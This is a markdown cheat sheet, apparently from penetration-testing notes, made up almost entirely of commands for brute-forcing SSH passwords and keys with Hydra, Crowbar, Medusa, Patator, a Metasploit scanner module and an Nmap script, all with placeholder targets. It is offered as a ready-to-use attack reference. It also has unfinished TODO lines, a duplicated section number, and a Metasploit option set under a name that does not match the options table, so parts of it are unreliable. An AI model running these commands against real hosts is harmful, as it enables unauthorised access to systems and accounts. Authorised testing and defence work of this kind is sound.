# SSH

## 01 - Hydra

`$ hydra ssh -U`

`$ hydra -l <username> -P passwords.lst ssh://<IP>`

TODO: Provide a syntax to bruteforce ssh keys

`$ hydra sshkey -U`

## 02 - Crowbar

TODO: Provide a syntax of sshkey to brute force targets with crowbar

`$ crowbar -b sshkey -s <IP>/<CIDR> -u <username> -k /path/to/id_rsa`

## 03 - Medusa

`$ medusa -h <IP> -u <username> -p <password> -M ssh`

## 04 - Patator

`$ patator ssh_login -t <int> host=<IP> port=22 user=<username> password=FILE0 0=passwords.lst -x ignore:mesg='Authentication failed.'`

## 05 - Metasploit

- Bruteforce SSH Public Keys

Note: Any file extension that ends with `.pub`

```
msf > use scanner/ssh/ssh_identify_pubkeys

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > options

Module options (auxiliary/scanner/ssh/ssh_identify_pubkeys):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   KEY_FILE                           yes       Filename of one or several cleartext public keys.
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set filename <ssh_public_key>

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > run -j
```

## 05 - Nmap

- Bruteforce SSH Public Keys

```
$ nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" <IP>

$ nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}' <IP>
```